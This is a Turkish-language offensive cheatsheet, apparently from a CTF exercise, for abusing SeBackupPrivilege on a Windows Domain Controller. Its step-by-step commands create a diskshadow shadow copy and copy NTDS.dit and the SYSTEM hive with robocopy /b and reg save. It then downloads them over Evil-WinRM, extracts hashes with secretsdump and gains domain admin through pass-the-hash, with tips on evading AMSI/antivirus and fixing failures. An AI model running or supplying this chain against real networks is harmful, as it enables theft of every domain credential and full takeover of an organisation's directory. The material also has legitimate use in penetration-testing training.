
# SeBackupPrivilege Abuse Cheatsheet — NTDS.dit Exfiltration → PtH

Senaryo: `SeBackupPrivilege`'a sahip (ama local admin olmayan) bir kullanıcı olarak shell aldın (örn. Evil-WinRM ile). Amaç: bu privilege'ı kullanarak Domain Controller'daki `NTDS.dit` + `SYSTEM` hive'ını exfiltrate edip domain hash'lerini çıkarmak.

## 1. Privilege doğrulama ve enable

```powershell
whoami /priv
```

`SeBackupPrivilege` listede ama **Disabled** durumda görünür — bu normal, token'da mevcut olması yeterli, PowerShell cmdlet'leri kullanırken otomatik enable edilir.

- **Listede yoksa** → bu kullanıcı için yol kapalı, farklı bir privesc vektörü ara (bu cheatsheet burada işe yaramaz).
- **Listede varsa (Disabled/Enabled fark etmez)** → devam et.

[Get the files](https://github.com/giuliano108/SeBackupPrivilege/tree/master/SeBackupPrivilegeCmdLets/bin/Debug)

```powershell
Import-Module .\SeBackupPrivilegeCmdLets.dll
Import-Module .\SeBackupPrivilegeUtils.dll
```

İki DLL'i hedef makineye upload etmen gerekir (`upload` — Evil-WinRM üzerinden, veya SMB share). Cmdlet'ler: `Get-SeBackupPrivilege`, `Enable-SeBackupPrivilege`, `Set-SeBackupPrivilege`.

- **Import başarısızsa / "cannot be loaded" hatası** → AMSI/AV engelliyor olabilir, DLL'leri obfuscate et ya da farklı bir dizine (ör. `C:\Windows\Temp`) taşımayı dene.
- **Başarılıysa** → `Enable-SeBackupPrivilege` çalıştır, sonra devam et.

## 2. Shadow copy oluşturma (diskshadow)

> **Kritik nokta:** `diskshadow.exe` interaktif konsol bekler, Evil-WinRM'in pipe'ı bunu desteklemez ("Error reading from console"). Çözüm: komutları script dosyasına yaz, `/s` ile çalıştır.

**Script oluşturma (satır satır, encoding sorunlarından kaçınmak için `Add-Content` kullan — `Out-File` UTF-16 yazıp diskshadow'u bozabilir):**

```powershell
Add-Content script.txt "set metadata C:\Windows\Temp\meta.cab"
Add-Content script.txt "set context persistent nowriters"
Add-Content script.txt "add volume c: alias mydrive"
Add-Content script.txt "create"
Add-Content script.txt "expose %mydrive% z:"
diskshadow /s script.txt
```

|Satır|Amaç|
|---|---|
|`set metadata <path>`|`.cab` metadata dosyasının yazılacağı yer. **Yazılabilir bir dizin olmalı** — Desktop gibi bazı dizinler read-only olabilir.|
|`set context persistent nowriters`|Shadow copy'nin oturum kapanınca silinmemesini, VSS writer'ları beklememesini sağlar.|
|`add volume c: alias mydrive`|Hangi volume'ün shadow copy'sinin alınacağını tanımlar.|
|`create`|Shadow copy'yi oluşturur.|
|`expose %mydrive% z:`|Oluşan shadow copy'yi bir drive letter'a mount eder.|

**Decision logic:**

- **`create` → "The .cab metadata file cannot be stored... read-only"** → çalıştığın dizin yazılamıyor demektir. `set metadata` satırını `C:\Windows\Temp\meta.cab` gibi kesin yazılabilir bir yola çevir, script'i baştan oluştur.
- **`create` → shadow copy ID + "Not exposed" satırıyla başarılı çıktı** → sıradaki satıra (`expose`) geç, script otomatik devam eder.
- **`expose` → "successfully exposed as z:\"** → başarılı, adım 3'e geç.
- **`expose` → hata** → `Get-PSDrive` ile Z:'nin gerçekten mount olup olmadığını kontrol et; olmadıysa script'i `Get-Content script.txt` ile kontrol edip tekrar dene.

## 3. NTDS.dit ve SYSTEM hive'ını çıkar

Z: mount olduktan sonra doğrula:

```powershell
dir Z:\Windows\NTDS
```

`ntds.dit` dosyasını görüyorsan devam et.

```powershell
robocopy /b Z:\Windows\NTDS C:\Windows\Temp ntds.dit
reg save HKLM\SYSTEM C:\Windows\Temp\system.bak
```

- **`robocopy`'de normal `copy` değil `/b` (backup mode) kullanılmalı** — SeBackupPrivilege sayesinde dosya kilidi/ACL'i bypass eder. Normal `copy` "file in use" hatası verir çünkü NTDS.dit her zaman AD tarafından açık tutulur.
- **Robocopy "Access denied" verirse** → SeBackupPrivilege token'da enable değil, adım 1'e dön (`Enable-SeBackupPrivilege`).
- **"Files: 1, Copied: 1" özeti görürsen** → başarılı, `C:\Windows\Temp\ntds.dit` hazır.
- **`reg save` "operation completed successfully" derse** → `system.bak` hazır, adım 4'e geç.

## 4. Dosyaları indir ve hash'leri çıkar

```powershell
download C:\Windows\Temp\ntds.dit
download C:\Windows\Temp\system.bak
```

(Evil-WinRM'in kendi `download` komutu — ntds.dit birkaç MB olabilir, biraz sürer.)

Kendi makinende:

```bash
secretsdump.py -ntds ntds.dit -system system.bak LOCAL
```

- **Çıktıda `Administrator:500:...` formatında NT hash görürsen** → adım 5'e geç.
- **"Could not find HBOOT_KEY" veya benzeri parse hatası** → system.bak bozuk kopyalanmış olabilir (encoding/binary transfer sorunu), `reg save` + `download` adımını tekrarla.

## 5. Pass-the-Hash ile domain admin doğrulama

```bash
nxc smb <DC_IP> -u Administrator -H <NT_hash> -d BLACKFIELD.LOCAL
```

- **"Pwn3d!" görürsen** → tam yönetici erişimi doğrulandı.

```bash
evil-winrm -i <DC_IP> -u Administrator -H <NT_hash>
```

- **Shell açılırsa** → domain admin seviyesinde tam kontrol, `root.txt`/hedef dosyalara eriş.
- **"Access denied" alırsan** → hash yanlış kopyalanmış olabilir (32 karakter NT hash, LM kısmı gerekmez) ya da hesap devre dışı; secretsdump çıktısını tekrar kontrol et.

## Typical flow

`whoami /priv` (SeBackupPrivilege var mı) → DLL import + enable → diskshadow script (`/s`) ile shadow copy oluştur ve mount et → `robocopy /b` ile ntds.dit + `reg save` ile SYSTEM hive'ı çek → indir → `secretsdump.py` ile hash çıkar → `nxc`/`evil-winrm` ile PtH.

Her adım başarısız olursa pivot: diskshadow çalışmıyorsa (yazma izni hiçbir yerde yoksa) alternatif olarak `wbadmin` ile sistem yedeği alıp NTDS'i oradan çekmeyi dene; SeBackupPrivilege hiç yoksa bu yol tamamen kapalıdır, farklı bir local privesc/credential dump vektörüne (LAPS, GPP, kerberoasting vb.) geç.